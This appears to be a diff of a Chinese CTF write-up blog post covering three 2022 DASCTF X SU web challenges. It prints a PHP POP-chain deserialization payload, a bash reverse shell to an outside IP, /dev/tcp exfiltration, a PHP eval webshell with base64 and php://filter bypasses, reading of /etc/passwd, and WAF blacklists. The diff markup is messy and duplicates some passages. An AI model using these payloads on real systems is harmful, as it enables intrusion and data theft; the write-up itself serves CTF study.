+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php://filter/convert.base64-decode/resource=39ab6b7b4e9946f4fef4d99ee6be3446.php//php文件是刚刚上传的a.php</span><br><span class="line">base64编码绕过——&gt;</span><br><span class="line">cGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWRlY29kZS9yZXNvdXJjZT0zOWFiNmI3YjRlOTk0NmY0ZmVmNGQ5OWVlNmJlMzQ0Ni5waHA=</span><br></pre></td></tr></table></figure>
 
-class what
-{
-    public $a;
+<p>只需要用上述代码将上传的<code>a.php</code>代码读取出来然后再用包含函数include结合即可，因此再上传<code>b.php</code>（php函数名不区分大小写，可利用此点绕过）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php Include(base64_decode(&quot;cGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWRlY29kZS9yZXNvdXJjZT0zOWFiNmI3YjRlOTk0NmY0ZmVmNGQ5OWVlNmJlMzQ0Ni5waHA=&quot;));?&gt;</span><br></pre></td></tr></table></figure>
 
-    public function __toString()
-    {
-        $this->a->run();
-        return 'hello';
-    }
-}
-class mix
-{
-    public $m1;
-
-    public function run()
-    {
-        ($this->m1)();
-    }
-
-    public function get_flag()
-    {
-        eval('#' . $this->m1);
-    }
-
-}
-
-//fin::__destruct() --> what::__toString() --> fin::run() --> crow::__invoke() --> fin::__call() --> mix::get_flag()
-
-$a=new fin();//为了调用__destruct()方法
-$b=new fin();
-//$b=new mix;
-$c=new fin();
-$d=new crow();
-$e=new what();
-$f=new mix();
-
-$a->f1=$e;//为了调用__toString()方法
-$e->a=$b;//为了去调用run方法
-$b->f1=$d;//为了去调用__invoke()方法
-$d->v1=$c;//为了去调用__call()方法
-$c->f1=$f;//为了去调用get_flag()方法 
-$f->m1="\nsystem('ls /');" ;//用 \n 绕过注释符
-
-echo urlencode(serialize($a));
-?>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">得到`O%3A3%3A%22fin%22%3A1%3A%7Bs%3A2%3A%22f1%22%3BO%3A4%3A%22what%22%3A1%3A%7Bs%3A1%3A%22a%22%3BO%3A3%3A%22fin%22%3A1%3A%7Bs%3A2%3A%22f1%22%3BO%3A4%3A%22crow%22%3A2%3A%7Bs%3A2%3A%22v1%22%3BO%3A3%3A%22fin%22%3A1%3A%7Bs%3A2%3A%22f1%22%3BO%3A3%3A%22mix%22%3A1%3A%7Bs%3A2%3A%22m1%22%3Bs%3A16%3A%22%0Asystem%28%27ls+%2F%27%29%3B%22%3B%7D%7Ds%3A2%3A%22v2%22%3BN%3B%7D%7D%7D%7D`</span><br><span class="line"></span><br><span class="line">最后用bp传参即可（这里用`ls /`命令查根目录较麻烦，于是用`ls`查当前目录，也不很好找，最后选择用`cat *`查看所有文件，结果如下图）</span><br><span class="line">&lt;img src=&quot;https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220822003739417-1945498056.png&quot; width=500&gt;</span><br><span class="line">成功找到flag！</span><br><span class="line"></span><br><span class="line">**</span><br><span class="line">该题在构造pop链上思路不算混乱（可能跟我偷看了一眼wp有关），但是在传参上遇到了很大的问题，一方面HackBar（估计是HB自身问题）总是失败搞人心态，另一方面用burp suite发送POST请求的方法没有掌握，即有三个地方需要修改：</span><br><span class="line">1、GET修改为POST方法</span><br><span class="line">2、加上媒体类型信息：Content-Type: application/x-www-form-urlencoded</span><br><span class="line">3、末尾添加需上传语句：cmd=xxxx</span><br><span class="line">**</span><br><span class="line"></span><br><span class="line">另外有师傅在构造exp时传入`&quot;?&gt;&lt;? @eval(\$_POST[b]);&quot;`，继而利用蚁剑连接找flag，但是博主尚未弄清蚁剑🗡的这一功能，待研究后更新。</span><br><span class="line">详情请访问这位师傅的Blog[【2022DASCTF X SU】 三月春季挑战赛 web复现](https://blog.csdn.net/qq_51295677/article/details/124283836?spm=1001.2101.3001.6650.1&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-1-124283836-blog-123774410.t0_layer_searchtargeting_sa&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-1-124283836-blog-123774410.t0_layer_searchtargeting_sa&amp;utm_relevant_index=2)</span><br><span class="line"></span><br><span class="line">##&lt;a id=&quot;b&quot;&gt;calc&lt;/a&gt;</span><br><span class="line">题目上来就给个计算器，打开源码，发现是用python写的计算器。源码放在下面：</span><br></pre></td></tr></table></figure>
-<p>#coding&#x3D;utf-8<br>from flask import Flask,render_template,url_for,render_template_string,redirect,request,current_app,session,abort,send_from_directory<br>import random<br>from urllib import parse<br>import os<br>from werkzeug.utils import secure_filename<br>import time</p>
-<p>app&#x3D;Flask(<strong>name</strong>)</p>
-<p>def waf(s):<br>    blacklist &#x3D; [‘import’,’(‘,’)’,’ ‘,’_’,’|’,’;’,’”‘,’{‘,’}’,’&amp;’,’getattr’,’os’,’system’,’class’,’subclasses’,’mro’,’request’,’args’,’eval’,’if’,’subprocess’,’file’,’open’,’popen’,’builtins’,’compile’,’execfile’,’from_pyfile’,’config’,’local’,’self’,’item’,’getitem’,’getattribute’,’func_globals’,’<strong>init</strong>‘,’join’,’<strong>dict</strong>‘]<br>    flag &#x3D; True<br>    for no in blacklist:<br>        if no.lower() in s.lower():<br>            flag&#x3D; False<br>            print(no)<br>            break<br>    return flag</p>
-<p>@app.route(“&#x2F;“)<br>def index():<br>    “欢迎来到SUctf2022”<br>    return render_template(“index.html”)</p>
-<p>@app.route(“&#x2F;calc”,methods&#x3D;[‘GET’])<br>def calc():<br>    ip &#x3D; request.remote_addr<br>    num &#x3D; request.values.get(“num”)<br>    log &#x3D; “echo {0} {1} {2}&gt; .&#x2F;tmp&#x2F;log.txt”.format(time.strftime(“%Y%m%d-%H%M%S”,time.localtime()),ip,num)</p>
-<pre><code>if waf(num):
-    try:
-        data = eval(num)
-        os.system(log)
-    except:
-        pass
-    return str(data)
-else:
-    return &quot;waf!!&quot;
-</code></pre>
-<p>if <strong>name</strong> &#x3D;&#x3D; “<strong>main</strong>“:<br>    app.run(host&#x3D;’0.0.0.0’,port&#x3D;5000) </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line">审查代码发现有`GET`传参，找到了口子。分析可知是用`GET`传参控制`num`变量，作为`log = &quot;echo &#123;0&#125; &#123;1&#125; &#123;2&#125;&gt; ./tmp/log.txt&quot;`中的`&#123;2&#125;`。再看下去就能发现两个很敏感的函数：</span><br></pre></td></tr></table></figure>
-<p>  data &#x3D; eval(num) &#x2F;&#x2F;<br>  os.system(log) &#x2F;&#x2F;将字符串转化成命令在服务器上运行</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[os.system()](https://blog.csdn.net/W1995S/article/details/114759238)</span><br><span class="line">由于`num`被`waf()`过滤得太多，我们只能把目标放在`os.system(log)`上，想办法对`log`下手，查找bash shell中可以做命令替换的函数：`$()、eval()与``反引号`，由于`$和eval`被过滤，这里只能选用反引号（优先执行\`代码\`）。[资料查阅：[反引号与$()的区别以及eval的作用](https://blog.csdn.net/hj605635529/article/details/73556855)]</span><br><span class="line">需要注意的是，程序会将num插入到log字符串的最后然后先后执行 eval（num）和os.system（log），因此不能让eval(num)报错而无法进行下一步，考虑python的特性，想到可以利用注释符`#`注释。</span><br><span class="line">接下来，我们希望建立反弹shell，将其命令行的输入输出转到我们的攻击端</span><br></pre></td></tr></table></figure>
-<p>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;攻击端IP&#x2F;攻击端监听端口 0&gt;&amp;1<br>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;101.43.119.212&#x2F;12306 0&gt;&amp;1</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[资料查阅：[Linux下反弹shell的原理](https://blog.csdn.net/m0_57497184/article/details/123404378)]</span><br><span class="line">但是`&amp;`也被ban了，没法直接用，但是也能得出一个思路：**输出重定向到攻击机**。</span><br><span class="line">```payload：/calc?num=1%23`ls%09&gt;/dev/tcp/IP/2333` ```</span><br><span class="line">这里由于空格被过滤，`ls &gt;`写成`ls%09&gt;`，然后在攻击端监听2333端口`nc -lvp 2333`</span><br><span class="line">然后修改`ls`命令即可，这里博主服务器监听不到，仍然在找问题。</span><br><span class="line"></span><br><span class="line">***</span><br><span class="line"></span><br><span class="line">##&lt;a id=&quot;c&quot;&gt;upgdstore&lt;/a&gt;</span><br><span class="line">文件上传题，随便上传一个文件试试</span><br><span class="line"></span><br><span class="line">&lt;img src=&quot;https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220823191351613-1945987939.png&quot; width=200&gt;</span><br><span class="line"></span><br><span class="line">由此可以得知该题目只能上传php文件。直接试试`webshell.php`传一句话木马，结果不出意料的失败了，又试了几个木马的变形，发现都无济于事，像无头苍蝇一样乱撞。只传入`phpinfo()`看看有什么收获</span><br><span class="line">&lt;img src=&quot;https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220823191704191-1792350946.png&quot; width=500&gt;</span><br><span class="line">发现一大堆`disable_functions`，基本上所有的恶意函数全部都被过滤，接下来试试用**拼接绕过**的办法读取`/etc/passwd`</span><br><span class="line">&gt; Linux 系统中的 /etc/passwd 文件，是系统用户配置文件，存储了系统中所有用户的基本信息，并且所有用户都可以对此文件执行读操作。</span><br><span class="line"></span><br><span class="line">这里我们用最常用的`file_get_contents() 函数`来读取文件</span><br></pre></td></tr></table></figure>
-<?php
-echo ("fil"."e_get_c"."ontents")("/etc/passwd");
-?>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220823211231635-994180552.png&quot; width=500&gt;</span><br><span class="line"></span><br><span class="line">成功读取。</span><br><span class="line">那么根据**Web服务器的默认根文件夹**`/var/www/html`，可以尝试读取网站源码（这里尝试`index.php`），将文件代码改为</span><br></pre></td></tr></table></figure>
-<?php
-echo ("fil"."e_get_c"."ontents")("/var/www/html/index.php");
-?>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">上传后打开，查看源码</span><br></pre></td></tr></table></figure>
-<?php
-function fun($var): bool{
-    $blacklist = ["\$_", "eval","copy" ,"assert","usort","include", "require", "$", "^", "~", "-", "%", "*","file","fopen","fwriter","fput","copy","curl","fread","fget","function_exists","dl","putenv","system","exec","shell_exec","passthru","proc_open","proc_close", "proc_get_status","checkdnsrr","getmxrr","getservbyname","getservbyport", "syslog","popen","show_source","highlight_file","`","chmod"];
-
-    foreach($blacklist as $blackword){
-        if(strstr($var, $blackword)) return True;
-    }
-
-    
-    return False;
-}
-error_reporting(0);
-//设置上传目录
-define("UPLOAD_PATH", "./uploads");
-$msg = "Upload Success!";
-if (isset($_POST['submit'])) {
-$temp_file = $_FILES['upload_file']['tmp_name'];
-$file_name = $_FILES['upload_file']['name'];
-$ext = pathinfo($file_name,PATHINFO_EXTENSION);
-if(!preg_match("/php/i", strtolower($ext))){
-die("只要好看的php");
-}
-
-$content = file_get_contents($temp_file);
-if(fun($content)){
-    die("诶，被我发现了吧");
-}
-$new_file_name = md5($file_name).".".$ext;
-        $img_path = UPLOAD_PATH . '/' . $new_file_name;
-
-
-        if (move_uploaded_file($temp_file, $img_path)){
-            $is_upload = true;
-        } else {
-            $msg = 'Upload Failed!';
-            die();
-        }
-        echo '<div style="color:#F00">'.$msg." Look here~ ".$img_path."</div>";
-}
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">发现过滤掉了`$_、eval、assert`等字符串，也难怪最初尝试的后门上传失败。于是先上传了webshell的base64编码php文件——`a.php`。</span><br></pre></td></tr></table></figure>
-<?php @eval($_POST[1]); ?><p>&#x2F;&#x2F;不要忘记在php关键字后加空格！！！<br>base64编码绕过——&gt;<br>PD9waHAgQGV2YWwoJF9QT1NUWzFdKTsgPz4&#x3D;</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">但`反引号`被ban，也不知道如何把代码读取出来然后解码，也断绝了我用base64解码后再执行的想法。在其他大佬那里学到了[**PHP伪协议**](https://blog.csdn.net/cosmoslin/article/details/120695429)，了解到`php://filter`+`convert.base64-decode过滤器`能解决问题。</span><br><span class="line">&gt; php://filter可以获取指定文件源码。当它与包含函数结合时，php://filter流会被当作php文件执行</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;39ab6b7b4e9946f4fef4d99ee6be3446.php&#x2F;&#x2F;php文件是刚刚上传的a.php<br>base64编码绕过——&gt;<br>cGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWRlY29kZS9yZXNvdXJjZT0zOWFiNmI3YjRlOTk0NmY0ZmVmNGQ5OWVlNmJlMzQ0Ni5waHA&#x3D;</p>
-<p>&#96;&#96;&#96;<br>只需要用上述代码将上传的<code>a.php</code>代码读取出来然后再用包含函数include结合即可，因此再上传<code>b.php</code>（php函数名不区分大小写，可利用此点绕过）<br><code>&lt;?php Include(base64_decode(&quot;cGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWRlY29kZS9yZXNvdXJjZT0zOWFiNmI3YjRlOTk0NmY0ZmVmNGQ5OWVlNmJlMzQ0Ni5waHA=&quot;));?&gt; </code><br>但是博主尝试了一段时间结果怎么也传不上去，人麻中麻了属于是，结果发现是上传的文件名（web64.php）经md5加密然后base64编码后出现了<code>dl</code>，被过滤了。换了名字后成功上传。<br><img src="https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220823231937120-1672813092.png" width=500><br>执行命令成功，但是蚁剑无法连接（大抵是因为有太多函数被ban了），只能用其他办法解决了。</p>
+<p>但是博主尝试了一段时间结果怎么也传不上去，人麻中麻了属于是，结果发现是上传的文件名（web64.php）经md5加密然后base64编码后出现了<code>dl</code>，被过滤了。换了名字后成功上传。<br><img src="https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220823231937120-1672813092.png" width=500><br>执行命令成功，但是蚁剑无法连接（大抵是因为有太多函数被ban了），只能用其他办法解决了。</p>
 <p>网上查阅其他师傅的wp，发现要用到<strong>LD_PRELOAD劫持</strong>，后期学习更新。</p>
 <p>资料：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_51295677/article/details/124338635">浅谈LD_PRELOAD劫持</a></p>
 
